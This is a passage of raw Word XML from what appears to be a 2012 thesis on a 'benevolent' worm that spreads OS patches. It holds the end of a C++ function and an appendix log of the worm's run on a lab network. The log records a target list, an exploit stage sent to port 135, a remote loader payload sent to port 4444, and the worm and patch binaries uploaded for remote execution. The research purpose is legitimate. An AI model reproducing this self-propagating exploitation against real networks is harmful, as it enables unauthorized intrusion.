          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(std::</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="2E92C7"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>string</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="2E92C7"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>const_iterator</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> it = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>cmdLine.begin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">(); it &lt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>cmdLine.end</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(); it++ ) {</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">278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*it);</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>279         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">280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b/>
          <w:bCs/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>\0</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>'</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969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// not strictly required but nice to do</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">281         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>content.push_back</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>((</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>unsigned</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>char</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>) 0x1F);</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">282         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">283         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>return</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> content;</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>284 }</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009B2D4D" w:rsidRDefault="009B2D4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CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00EF35C4">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="45" w:name="_Toc321736810"/>
      <w:r w:rsidRPr="00861880">
        <w:lastRenderedPageBreak/>
        <w:t>Appendix D - Log file from run of worm originating from seed node</w:t>
      </w:r>
      <w:bookmarkEnd w:id="45"/>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Beginning execution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Log written to C:\Users\Administrator\AppData\Roaming/ThesisWorm/2012-04-05T174528,366Z.log</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Begin list of all environment variables and values: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ALLUSERSPROFILE ==&gt; C:\ProgramData</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APPDATA ==&gt; C:\Users\Administrator\AppData\Roaming</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CLIENTNAME ==&gt; ROMA</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CommonProgramFiles</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ==&gt; C:\Program Files (x86)\Common Files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CommonProgramFiles</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(x86) ==&gt; C:\Program Files (x86)\Common Files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CommonProgramW6432 ==&gt; C:\Program Files\Common Files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COMPUTERNAME ==&gt; WIN-SIO1RQKTOG0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ComSpec</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ==&gt; C:\Windows\system32\cmd.exe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FP_NO_HOST_CHECK ==&gt; NO</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HOMEDRIVE ==&gt; C:</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HOMEPATH ==&gt; \Users\Administrator</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LOCALAPPDATA ==&gt; C:\Users\Administrator\AppData\Local</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LOGONSERVER ==&gt; \\WIN-SIO1RQKTOG0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NUMBER_OF_PROCESSORS ==&gt; 1</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 xml:space="preserve">OS ==&gt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Windows_NT</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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Path ==&gt; C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\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PATHEXT ==&gt; .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC</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PROCESSOR_ARCHITECTURE ==&gt; x86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PROCESSOR_ARCHITEW6432 ==&gt; AMD64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 xml:space="preserve">PROCESSOR_IDENTIFIER ==&gt; Intel64 Family 6 Model 2 Stepping 3, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>GenuineIntel</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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2012-04-05T17:45:28,366Z</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t>PROCESSOR_LEVEL ==&gt; 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PROCESSOR_REVISION ==&gt; 0203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ProgramData</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ==&gt; C:\ProgramData</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ProgramFiles</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ==&gt; C:\Program Files (x86)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ProgramFiles</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(x86) ==&gt; C:\Program Files (x86)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ProgramW6432 ==&gt; C:\Program Files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PROMPT ==&gt; $P$G</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PSModulePath</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ==&gt; C:\Windows\system32\WindowsPowerShell\v1.0\Modules\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PUBLIC ==&gt; C:\Users\Public</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SESSIONNAME ==&gt; RDP-Tcp#0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SystemDrive</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ==&gt; C:</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SystemRoot</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ==&gt; C:\Windows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TEMP ==&gt; C:\Users\ADMINI~1\AppData\Local\Temp\2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TMP ==&gt; C:\Users\ADMINI~1\AppData\Local\Temp\2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USERDOMAIN ==&gt; WIN-SIO1RQKTOG0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USERNAME ==&gt; Administrator</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USERPROFILE ==&gt; C:\Users\Administrator</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windir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ==&gt; C:\Windows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End of all environment variables and values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 xml:space="preserve">Begin list of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>argv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w: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thesisworm.exe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thesisworm.exe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Research_Options_File.txt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2012-04-05T17:45:28,366Z</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t>WindowsXP-KB823980-x86-ENU.exe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ISSEED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 xml:space="preserve">End list of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>argv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w: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Version hash:  356d08eb50ab1bbec9b176635f9e189e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2012-04-05T17:45:28,381Z</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t>Hostname (according to OS not DNS) is WIN-SIO1RQKTOG0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Host addresses on machine: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fe80::f4d1:6809:151b:b1d2%17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fe80::98a0:4983:b6a0:cd83%15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fe80::59fd:7237:e6e2:6d14%14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172.16.0.50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192.168.0.2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10.0.0.137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Parent (source) of worm IP address:  192.168.0.2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Parent (source) timestamp:  2012-03-23T14:50:37,537Z</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Root server for worm has IP/ID of:  192.168.0.2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Target List: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192.168.0.151</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192.168.0.158</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192.168.0.159</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192.168.0.161</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192.168.0.168</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192.168.0.169</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192.168.0.171</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192.168.0.178</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192.168.0.179</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192.168.0.181</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192.168.0.186</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r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t>192.168.0.187</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Local system time for worm is 2012-04-05T17:45:28,381Z</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Worm running as seed so not executing OS update patch for this machine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Attempting target 192.168.0.150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Sending exploit stage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2012-04-05T17:45:28,381Z</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t>Using timeout value of 5 seconds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DEBUG:  Starting connect attempt to 192.168.0.150:135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2012-04-05T17:45:28,381Z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start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end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successful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Connection channel (TCP) established:  192.168.0.2:51355 -&gt; 192.168.0.150:135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Attempting to send 2404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Sent 2404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close() for 192.168.0.150:135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2012-04-05T17:45:28,397Z</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t>Closed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Sending remote loader payload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Using timeout value of 5 seconds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DEBUG:  Starting connect attempt to 192.168.0.150:4444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start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end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successful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Connection channel (TCP) established:  192.168.0.2:51358 -&gt; 192.168.0.150:4444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Attempting to send 6550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Sent 6550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close() for 192.168.0.150:4444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Closed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Constructing options file with name WormOptions.2012-04-05T174529,411Z</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DEBUG:  Starting connect attempt to 192.168.0.150:135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start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end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successful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close() for 192.168.0.150:135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Options file (with SAVE) has length of 662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t>Constructing worm binary SAVE using C:\Users\Administrator\Desktop\thesisworm.exe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wrote SAVE header</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size of C:\Users\Administrator\Desktop\thesisworm.exe with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>destname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> of benevolent-worm.exe is 1496552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Allocating buffer of size 1496552</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2012-04-05T17:45:29,411Z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Buffer allocated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content size is 1496583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t>Worm binary executable (with SAVE) has length of 1496583</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t xml:space="preserve">Constructing </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>os</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> update binary SAVE using C:\Users\Administrator\Desktop\WindowsXP-KB823980-x86-ENU.exe</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wrote SAVE header</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size of C:\Users\Administrator\Desktop\WindowsXP-KB823980-x86-ENU.exe with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>destname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> of os-update.exe is 1291040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Allocating buffer of size 1291040</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2012-04-05T17:45:29,426Z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Buffer allocated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r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>prepForSavingBinaryFile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> - content size is 1291065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Update binary executable (with SAVE) has length of 1291065</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Construction EXEC command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Sending worm code to remote loader for SAVE and EXEC</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Using timeout value of 5 seconds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DEBUG:  Starting connect attempt to 192.168.0.150:65534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start</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2012-04-05T17:45:29,442Z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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>async_connect</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> call end</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2012-04-05T17:45:29,957Z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successful connection</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lastRenderedPageBreak/>
        <w:t>2012-04-05T17:45:29,957Z</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t>Connection channel (TCP) established:  192.168.0.2:51364 -&gt; 192.168.0.150:65534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2012-04-05T17:45:29,957Z</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t>Attempting to send 2788405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2012-04-05T17:45:30,82Z</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t>Sent 2788405 bytes</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2012-04-05T17:45:30,82Z</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
